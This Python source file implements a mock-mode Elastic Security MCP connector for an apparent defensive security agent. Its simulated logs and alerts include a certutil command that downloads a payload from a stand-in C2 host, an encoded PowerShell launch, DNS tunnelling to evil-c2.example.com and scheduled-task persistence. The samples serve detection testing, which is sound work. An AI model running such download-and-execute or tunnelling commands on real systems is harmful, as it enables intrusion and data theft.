"""Elastic Security MCP server connector.

Tools:
- elastic_search(query, index, timerange)
- elastic_get_alerts(severity)
- elastic_get_fields(index)

Mock mode returns realistic EQL/KQL results, alert payloads,
and index field mappings.
"""

from __future__ import annotations

import logging
import os
from typing import Any

from langchain_core.tools import tool

logger = logging.getLogger("btagent.mcp.servers.elastic")

MOCK_MODE = os.getenv("BTAGENT_MOCK_CONNECTORS", "true").lower() == "true"


# ---------------------------------------------------------------------------
# Mock data
# ---------------------------------------------------------------------------

_MOCK_SEARCH_RESULTS: dict[str, list[dict[str, Any]]] = {
    "default": [
        {
            "_index": "filebeat-2026.03.26",
            "_id": "es_doc_001",
            "_score": 12.4,
            "_source": {
                "@timestamp": "2026-03-26T08:22:05.000Z",
                "host": {"name": "WS-JSMITH-PC", "ip": "10.1.42.17"},
                "process": {
                    "name": "powershell.exe",
                    "pid": 7284,
                    "executable": (
                        "C:\\Windows\\System32\\WindowsPowerShell"
                        "\\v1.0\\powershell.exe"
                    ),
                    "args": ["-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."],
                    "parent": {
                        "name": "cmd.exe",
                        "pid": 6140,
                        "executable": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "user": {"name": "jsmith", "domain": "ACME"},
                "event": {
                    "category": ["process"],
                    "type": ["start"],
                    "action": "process_created",
                },
                "agent": {"type": "endpoint", "version": "8.14.0"},
            },
        },
        {
            "_index": "filebeat-2026.03.26",
            "_id": "es_doc_002",
            "_score": 11.2,
            "_source": {
                "@timestamp": "2026-03-26T07:55:28.000Z",
                "host": {"name": "WS-JSMITH-PC", "ip": "10.1.42.17"},
                "process": {
                    "name": "certutil.exe",
                    "pid": 8120,
                    "executable": "C:\\Windows\\System32\\certutil.exe",
                    "args": [
                        "-urlcache",
                        "-split",
                        "-f",
                        "https://evil-c2.example.com/payload.bin",
                        "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe",
                    ],
                    "parent": {
                        "name": "powershell.exe",
                        "pid": 7284,
                    },
                },
                "user": {"name": "jsmith", "domain": "ACME"},
                "event": {
                    "category": ["process"],
                    "type": ["start"],
                    "action": "process_created",
                },
                "agent": {"type": "endpoint", "version": "8.14.0"},
            },
        },
    ],
    "network": [
        {
            "_index": "packetbeat-2026.03.26",
            "_id": "es_doc_010",
            "_score": 8.7,
            "_source": {
                "@timestamp": "2026-03-26T08:24:01.000Z",
                "source": {"ip": "10.1.42.17", "port": 51432},
                "destination": {"ip": "198.51.100.23", "port": 443},
                "network": {
                    "transport": "tcp",
                    "protocol": "tls",
                    "bytes": 154832,
                    "direction": "outbound",
                },
                "tls": {
                    "version": "1.3",
                    "server": {
                        "ja3s": "eb1d94daa7e0344597e756a1fb6e7054",
                    },
                },
                "host": {"name": "WS-JSMITH-PC"},
                "event": {
                    "category": ["network"],
                    "type": ["connection"],
                    "action": "network_flow",
                },
            },
        },
        {
            "_index": "packetbeat-2026.03.26",
            "_id": "es_doc_011",
            "_score": 8.1,
            "_source": {
                "@timestamp": "2026-03-26T08:23:12.000Z",
                "source": {"ip": "10.1.42.17", "port": 50812},
                "destination": {"ip": "203.0.113.45", "port": 8443},
                "network": {
                    "transport": "tcp",
                    "protocol": "tls",
                    "bytes": 42561,
                    "direction": "outbound",
                },
                "host": {"name": "WS-JSMITH-PC"},
                "event": {
                    "category": ["network"],
                    "type": ["connection"],
                    "action": "network_flow",
                },
            },
        },
    ],
    "dns": [
        {
            "_index": "packetbeat-2026.03.26",
            "_id": "es_doc_020",
            "_score": 9.5,
            "_source": {
                "@timestamp": "2026-03-26T06:30:22.000Z",
                "source": {"ip": "10.1.15.88"},
                "destination": {"ip": "192.0.2.100", "port": 53},
                "dns": {
                    "question": {
                        "name": (
                            "aGVsbG8gd29ybGQgdGhpcyBpcyBhIH"
                            "Rlc3Q.data.evil-c2.example.com"
                        ),
                        "type": "TXT",
                    },
                    "response_code": "NOERROR",
                    "answers": [
                        {
                            "type": "TXT",
                            "data": "dGhpcyBpcyBhIHJlc3BvbnNlIGZyb20gdGhlIEMyIHNlcnZlcg==",
                        },
                    ],
                },
                "host": {"name": "SRV-DNS-01"},
                "event": {
                    "category": ["network"],
                    "type": ["protocol"],
                    "action": "dns_query",
                },
            },
        },
    ],
}

_MOCK_ALERTS = [
    {
        "alert_id": "alrt_elastic_001",
        "rule_id": "rule_001",
        "rule_name": "Encoded PowerShell Execution",
        "severity": "critical",
        "risk_score": 95,
        "status": "open",
        "timestamp": "2026-03-26T08:22:10.000Z",
        "host": {"name": "WS-JSMITH-PC", "ip": "10.1.42.17"},
        "user": {"name": "jsmith", "domain": "ACME"},
        "process": {
            "name": "powershell.exe",
            "args": ["-enc", "SQBFAFgAIAAoAE4AZQB3..."],
            "parent": {"name": "cmd.exe"},
        },
        "mitre": {
            "tactic": ["execution"],
            "technique": ["T1059.001"],
            "subtechnique": ["PowerShell"],
        },
        "signal": {
            "rule": {"type": "eql", "language": "eql"},
            "reason": (
                "powershell.exe executed with encoded command argument, "
                "spawned from cmd.exe (parent: outlook.exe)"
            ),
        },
    },
    {
        "alert_id": "alrt_elastic_002",
        "rule_id": "rule_002",
        "rule_name": "Certutil Download Cradle",
        "severity": "high",
        "risk_score": 80,
        "status": "open",
        "timestamp": "2026-03-26T07:55:30.000Z",
        "host": {"name": "WS-JSMITH-PC", "ip": "10.1.42.17"},
        "user": {"name": "jsmith", "domain": "ACME"},
        "process": {
            "name": "certutil.exe",
            "args": ["-urlcache", "-split", "-f", "https://evil-c2.example.com/payload.bin"],
            "parent": {"name": "powershell.exe"},
        },
        "mitre": {
            "tactic": ["defense-evasion", "command-and-control"],
            "technique": ["T1105", "T1140"],
            "subtechnique": ["Ingress Tool Transfer"],
        },
        "signal": {
            "rule": {"type": "eql", "language": "eql"},
            "reason": (
                "certutil.exe used to download file from external URL "
                "(evil-c2.example.com)"
            ),
        },
    },
    {
        "alert_id": "alrt_elastic_003",
        "rule_id": "rule_003",
        "rule_name": "Anomalous Outbound Data Volume",
        "severity": "high",
        "risk_score": 75,
        "status": "open",
        "timestamp": "2026-03-26T08:25:00.000Z",
        "host": {"name": "WS-JSMITH-PC", "ip": "10.1.42.17"},
        "user": {"name": "jsmith", "domain": "ACME"},
        "network": {
            "destination_ip": "198.51.100.23",
            "destination_port": 443,
            "bytes_sent": 154832000,
            "protocol": "tls",
        },
        "mitre": {
            "tactic": ["exfiltration"],
            "technique": ["T1041"],
            "subtechnique": ["Exfiltration Over C2 Channel"],
        },
        "signal": {
            "rule": {"type": "threshold", "language": "lucene"},
            "reason": (
                "154 MB transferred to 198.51.100.23:443 within 10 min, "
                "exceeding baseline by 15x"
            ),
        },
    },
    {
        "alert_id": "alrt_elastic_004",
        "rule_id": "rule_004",
        "rule_name": "Suspicious Scheduled Task Persistence",
        "severity": "medium",
        "risk_score": 55,
        "status": "open",
        "timestamp": "2026-03-26T06:12:05.000Z",
        "host": {"name": "SRV-DB-02", "ip": "10.2.10.54"},
        "user": {"name": "svc_backup", "domain": "ACME"},
        "process": {
            "name": "schtasks.exe",
            "args": [
                "/create",
                "/sc",
                "minute",
                "/mo",
                "15",
                "/tn",
                "SystemHealthCheck",
            ],
            "parent": {"name": "cmd.exe"},
        },
        "mitre": {
            "tactic": ["persistence"],
            "technique": ["T1053.005"],
            "subtechnique": ["Scheduled Task"],
        },
        "signal": {
            "rule": {"type": "eql", "language": "eql"},
            "reason": (
                "Scheduled task created to run every 15 minutes, "
                "executing binary from non-standard path"
            ),
        },
    },
    {
        "alert_id": "alrt_elastic_005",
        "rule_id": "rule_005",
        "rule_name": "DNS Tunnelling via TXT Records",
        "severity": "medium",
        "risk_score": 60,
        "status": "open",
        "timestamp": "2026-03-26T06:32:00.000Z",
        "host": {"name": "SRV-DNS-01"},
        "network": {
            "source_ip": "10.1.15.88",
            "destination_ip": "192.0.2.100",
            "dns_query": "data.evil-c2.example.com",
            "dns_type": "TXT",
        },
        "mitre": {
            "tactic": ["exfiltration", "command-and-control"],
            "technique": ["T1048.003", "T1071.004"],
            "subtechnique": ["DNS"],
        },
        "signal": {
            "rule": {"type": "threshold", "language": "lucene"},
            "reason": (
                "342 high-entropy DNS TXT queries to data.evil-c2.example.com "
                "in 4 minutes from 10.1.15.88"
            ),
        },
    },
]

_MOCK_FIELDS: dict[str, list[dict[str, Any]]] = {
    "filebeat-*": [
        {"field": "@timestamp", "type": "date"},
        {"field": "host.name", "type": "keyword"},
        {"field": "host.ip", "type": "ip"},
        {"field": "process.name", "type": "keyword"},
        {"field": "process.pid", "type": "long"},
        {"field": "process.executable", "type": "keyword"},
        {"field": "process.args", "type": "keyword"},
        {"field": "process.parent.name", "type": "keyword"},
        {"field": "process.parent.pid", "type": "long"},
        {"field": "user.name", "type": "keyword"},
        {"field": "user.domain", "type": "keyword"},
        {"field": "event.category", "type": "keyword"},
        {"field": "event.type", "type": "keyword"},
        {"field": "event.action", "type": "keyword"},
        {"field": "file.name", "type": "keyword"},
        {"field": "file.path", "type": "keyword"},
        {"field": "file.hash.sha256", "type": "keyword"},
        {"field": "agent.type", "type": "keyword"},
        {"field": "agent.version", "type": "keyword"},
    ],
    "packetbeat-*": [
        {"field": "@timestamp", "type": "date"},
        {"field": "source.ip", "type": "ip"},
        {"field": "source.port", "type": "long"},
        {"field": "destination.ip", "type": "ip"},
        {"field": "destination.port", "type": "long"},
        {"field": "network.transport", "type": "keyword"},
        {"field": "network.protocol", "type": "keyword"},
        {"field": "network.bytes", "type": "long"},
        {"field": "network.direction", "type": "keyword"},
        {"field": "dns.question.name", "type": "keyword"},
        {"field": "dns.question.type", "type": "keyword"},
        {"field": "dns.response_code", "type": "keyword"},
        {"field": "tls.version", "type": "keyword"},
        {"field": "tls.server.ja3s", "type": "keyword"},
        {"field": "host.name", "type": "keyword"},
        {"field": "event.category", "type": "keyword"},
    ],
    ".siem-signals-*": [
        {"field": "@timestamp", "type": "date"},
        {"field": "signal.rule.name", "type": "keyword"},
        {"field": "signal.rule.type", "type": "keyword"},
        {"field": "signal.status", "type": "keyword"},
        {"field": "signal.rule.severity", "type": "keyword"},
        {"field": "signal.rule.risk_score", "type": "long"},
        {"field": "host.name", "type": "keyword"},
        {"field": "user.name", "type": "keyword"},
        {"field": "process.name", "type": "keyword"},
        {"field": "threat.tactic.name", "type": "keyword"},
        {"field": "threat.technique.id", "type": "keyword"},
    ],
}


# ---------------------------------------------------------------------------
# Elastic MCP server class
# ---------------------------------------------------------------------------
class ElasticMCPServer:
    """Elastic Security MCP connector with mock and real modes."""

    server_id: str = "elastic"

    def __init__(self, *, mock_mode: bool | None = None) -> None:
        self.mock_mode = mock_mode if mock_mode is not None else MOCK_MODE

    # ---- tools ----

    async def elastic_search(
        self,
        query: str,
        index: str = "filebeat-*",
        timerange: str = "24h",
    ) -> dict[str, Any]:
        """Search Elastic Security indices using EQL, KQL, or Lucene.

        Args:
            query: Search query string.
            index: Elasticsearch index pattern (e.g. filebeat-*, packetbeat-*).
            timerange: Lookback window (e.g. 1h, 24h, 7d).

        Returns:
            Search hits with source documents and metadata.
        """
        if self.mock_mode:
            return self._mock_search(query, index, timerange)
        return self._real_search(query, index, timerange)

    async def elastic_get_alerts(
        self,
        severity: str = "all",
    ) -> dict[str, Any]:
        """Retrieve Elastic Security detection alerts.

        Args:
            severity: Filter by severity (critical, high, medium, low, all).

        Returns:
            Alert payloads with MITRE mappings and signal details.
        """
        if self.mock_mode:
            return self._mock_get_alerts(severity)
        return self._real_get_alerts(severity)

    async def elastic_get_fields(
        self,
        index: str = "filebeat-*",
    ) -> dict[str, Any]:
        """Get field mappings for an Elasticsearch index.

        Args:
            index: Elasticsearch index pattern.

        Returns:
            List of fields with their types.
        """
        if self.mock_mode:
            return self._mock_get_fields(index)
        return self._real_get_fields(index)

    # ---- mock implementations ----

    def _mock_search(
        self, query: str, index: str, timerange: str
    ) -> dict[str, Any]:
        q_lower = query.lower()
        if "dns" in q_lower or "tunnel" in q_lower:
            hits = _MOCK_SEARCH_RESULTS["dns"]
        elif "network" in q_lower or "packetbeat" in index or "flow" in q_lower:
            hits = _MOCK_SEARCH_RESULTS["network"]
        else:
            hits = _MOCK_SEARCH_RESULTS["default"]

        return {
            "status": "success",
            "query": query,
            "index": index,
            "timerange": timerange,
            "total_hits": len(hits),
            "hits": hits,
            "took_ms": 847,
            "timed_out": False,
            "is_mock": True,
        }

    def _mock_get_alerts(self, severity: str) -> dict[str, Any]:
        if severity == "all":
            alerts = _MOCK_ALERTS
        else:
            alerts = [
                a for a in _MOCK_ALERTS if a["severity"] == severity.lower()
            ]
        return {
            "status": "success",
            "total": len(alerts),
            "alerts": alerts,
            "is_mock": True,
        }

    def _mock_get_fields(self, index: str) -> dict[str, Any]:
        # Match the closest index pattern
        fields = _MOCK_FIELDS.get(index)
        if fields is None:
            # Try partial match
            for pattern, f in _MOCK_FIELDS.items():
                if pattern.rstrip("*-").rstrip("-") in index:
                    fields = f
                    break
        if fields is None:
            fields = _MOCK_FIELDS["filebeat-*"]
        return {
            "status": "success",
            "index": index,
            "field_count": len(fields),
            "fields": fields,
            "is_mock": True,
        }

    # ---- real implementations (placeholders) ----

    def _real_search(
        self, query: str, index: str, timerange: str
    ) -> dict[str, Any]:
        raise NotImplementedError("Real Elastic search not yet implemented")

    def _real_get_alerts(self, severity: str) -> dict[str, Any]:
        raise NotImplementedError("Real Elastic alerts not yet implemented")

    def _real_get_fields(self, index: str) -> dict[str, Any]:
        raise NotImplementedError("Real Elastic fields not yet implemented")

    # ---- tool metadata ----

    def get_tool_metadata(self) -> list[dict[str, Any]]:
        return [
            {
                "name": "elastic_search",
                "description": (
                    "Search Elastic Security indices using EQL, KQL, or "
                    "Lucene query strings."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "query": {
                            "type": "string",
                            "description": "Search query string",
                        },
                        "index": {
                            "type": "string",
                            "description": "Elasticsearch index pattern",
                            "default": "filebeat-*",
                        },
                        "timerange": {
                            "type": "string",
                            "description": "Lookback window",
                            "default": "24h",
                        },
                    },
                    "required": ["query"],
                },
            },
            {
                "name": "elastic_get_alerts",
                "description": (
                    "Retrieve Elastic Security detection alerts with MITRE "
                    "ATT&CK mappings and signal details."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "severity": {
                            "type": "string",
                            "enum": [
                                "critical",
                                "high",
                                "medium",
                                "low",
                                "all",
                            ],
                            "default": "all",
                        },
                    },
                },
            },
            {
                "name": "elastic_get_fields",
                "description": (
                    "Get field mappings for an Elasticsearch index "
                    "including field names and types."
                ),
                "server_id": self.server_id,
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "index": {
                            "type": "string",
                            "description": "Elasticsearch index pattern",
                            "default": "filebeat-*",
                        },
                    },
                },
            },
        ]


# ---------------------------------------------------------------------------
# Module-level LangChain tool instances
# ---------------------------------------------------------------------------
_server = ElasticMCPServer()


@tool
async def elastic_search(
    query: str,
    index: str = "filebeat-*",
    timerange: str = "24h",
) -> dict[str, Any]:
    """Search Elastic Security indices using EQL, KQL, or Lucene.

    Args:
        query: Search query string.
        index: Elasticsearch index pattern (e.g. filebeat-*, packetbeat-*).
        timerange: Lookback window (e.g. 1h, 24h, 7d).
    """
    return await _server.elastic_search(query, index, timerange)


@tool
async def elastic_get_alerts(severity: str = "all") -> dict[str, Any]:
    """Retrieve Elastic Security detection alerts.

    Args:
        severity: Filter by severity (critical, high, medium, low, all).
    """
    return await _server.elastic_get_alerts(severity)


@tool
async def elastic_get_fields(index: str = "filebeat-*") -> dict[str, Any]:
    """Get field mappings for an Elasticsearch index.

    Args:
        index: Elasticsearch index pattern.
    """
    return await _server.elastic_get_fields(index)
